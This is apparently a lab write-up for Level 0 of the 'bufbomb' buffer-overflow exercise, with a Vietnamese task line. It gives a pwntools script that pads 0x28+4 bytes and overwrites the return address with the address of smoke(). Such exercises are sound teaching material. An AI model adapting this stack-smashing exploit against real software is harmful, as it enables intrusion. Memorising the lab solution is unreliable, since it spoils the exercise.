# Level 0
## Task
Buffer overflow để thực thi hàm `smoke()`.

## Solution
```python
#! /bin/python3

from pwn import *

context.binary = './bufbomb'
io = process(['./bufbomb', '-u', '09821978'])

e = ELF('./bufbomb')
exploit_payload = b'A'*(0x28 + 4)
exploit_payload += p32(e.symbols['smoke'])

io.sendline(exploit_payload)
io.interactive()
```
